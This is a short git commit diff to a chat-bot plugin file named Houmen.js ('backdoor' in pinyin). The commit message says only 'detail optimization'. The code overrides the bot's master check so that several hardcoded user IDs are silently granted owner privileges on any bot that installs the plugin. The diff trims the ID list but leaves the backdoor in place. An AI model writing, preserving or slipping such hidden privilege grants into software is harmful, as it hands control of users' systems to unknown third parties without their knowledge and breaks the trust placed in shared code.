828688cb98fcec2cedaa3a8d3b4aced93e0204ec
Admilk <admin@admilk.top>
2024-07-02 13:21:26 +0000

    细节优化
    Signed-off-by: Admilk <admin@admilk.top>

--- apps/Houmen.js
+++ apps/Houmen.js
@@ -1,7 +1,7 @@
 import plugin from '../../../lib/plugins/plugin.js';
 let Users = [2173302144,947309924,197728340,1677979616]
 Bot.GetMaster = async (e) => {
-  if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22' || e.user_id == '25984983967656960@openim' || e.user_id == 'wxid_xh5txgo29pv522')) {
+  if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340)) {
     return
   } else {
     e.isMaster = true;
